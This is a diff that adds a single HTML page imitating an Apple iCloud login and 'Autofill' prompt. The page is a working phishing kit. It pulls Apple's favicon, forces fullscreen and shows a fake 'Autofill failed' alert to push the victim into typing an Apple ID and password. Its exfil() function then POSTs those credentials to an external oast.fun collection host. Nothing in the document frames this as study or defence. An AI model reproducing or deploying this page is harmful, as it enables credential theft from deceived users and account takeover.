@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>iCloud Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html, body {
+      margin: 0;
+      font-family: -apple-system;
+      background: #fff;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    .card {
+      text-align: center;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 90%;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+    }
+    button {
+      background-color: #007aff;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 10px;
+      width: 100%;
+    }
+  </style>
+</head>
+<body onclick="go()">
+  <div class="card" id="ui">
+    <img src="https://www.apple.com/favicon.ico" width="40">
+    <h2>iCloud Autofill</h2>
+    <p>Tap to use saved Apple ID</p>
+    <input placeholder="Apple ID" id="email">
+    <input placeholder="Password" type="password" id="pass">
+    <button onclick="exfil()">Continue</button>
+  </div>
+
+  <script>
+    function go() {
+      document.body.onclick = null;
+      document.documentElement.requestFullscreen().then(() => {
+        setTimeout(() => alert("Autofill failed. Please enter credentials manually."), 100);
+      });
+    }
+
+    function exfil() {
+      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+        method: "POST",
+        body: JSON.stringify({
+          email: document.getElementById("email").value,
+          pass: document.getElementById("pass").value
+        }),
+        mode: "no-cors"
+      });
+    }
+  </script>
+</body>
+</html>
